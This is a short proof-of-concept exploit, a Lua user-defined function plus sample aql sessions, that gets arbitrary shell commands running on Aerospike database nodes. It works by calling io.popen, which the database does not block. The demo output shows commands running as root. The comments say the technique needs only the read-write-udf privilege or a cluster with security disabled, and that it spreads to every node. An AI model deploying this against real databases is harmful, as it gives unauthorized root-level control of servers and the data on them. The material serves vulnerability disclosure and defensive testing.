---------------------------------------------
---- POC for executing code on aerospike nodes.
---- Can be run interactively (below), or with python-based POC.
---- Works for users with the read-write-udf privilege,
---- or just if you come across a cluster with security 
---- disabled :) 
----
---- Aerospike blocks os.execute() in lua udfs, but does
---- not block io.popen.
----
---- For the POC, we create a single row set to work with.
---- Registering the module will copy to all nodes in the 
---- cluster. Running the POC on sufficiently large 
---- dataset would eventually execute commands on each node.
---------------------------------------------
-- aql> insert into test.k9uf2mx90p (PK, x) values ('1', "A");
-- OK, 1 record affected.

-- aql> register module '/share/poc.lua'
-- OK, 1 module added.

-- aql> execute poc.runCMD("whoami") on test.k9uf2mx90p where PK='1'
-- +---------+
-- | runCMD  |
-- +---------+
-- | "root
-- " |
-- +---------+
-- 1 row in set (0.001 secs)

-- OK

-- aql> 
-- aql> 
-- aql> execute poc.runCMD("echo codexecution > /tmp/afile") on test.k9uf2mx90p where PK='1'
-- +--------+
-- | runCMD |
-- +--------+
-- | ""     |
-- +--------+
-- 1 row in set (0.002 secs)

-- OK

-- aql> execute poc.runCMD("cat /tmp/afile") on test.k9uf2mx90p where PK='1'
-- +-----------------+
-- | runCMD          |
-- +-----------------+
-- | "codexecution
-- " |
-- +-----------------+
-- 1 row in set (0.000 secs)

-- OK


---------------------------------------------


function runCMD(rec, cmd)
	local outtext = ""
	local phandle = io.popen(cmd)
	io.input(phandle)
	local foo = io.lines()
	for f in foo do
		outtext = outtext .. f .. "\n"
	end
	return outtext
end
